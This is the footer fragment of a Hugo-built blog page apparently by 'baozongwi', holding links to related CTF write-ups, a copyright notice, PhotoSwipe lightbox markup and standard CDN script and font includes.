<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/newstarctf-2023-public-track/><div class=article-details><h2 class=article-title>NewStarCTF 2023 公开赛道</h2></div></a></article><article><a href=/p/dest0g3-520-welcome-match/><div class=article-details><h2 class=article-title>Dest0g3 520迎新赛</h2></div></a></article><article><a href=/p/wustctf2020/><div class=article-details><h2 class=article-title>WUSTCTF2020</h2></div></a></article><article><a href=/p/gwctf2019/><div class=article-details><h2 class=article-title>GWCTF2019</h2></div></a></article><article><a href=/p/anxun-cup-2019/><div class=article-details><h2 class=article-title>安洵杯2019</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2024 -
2025 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>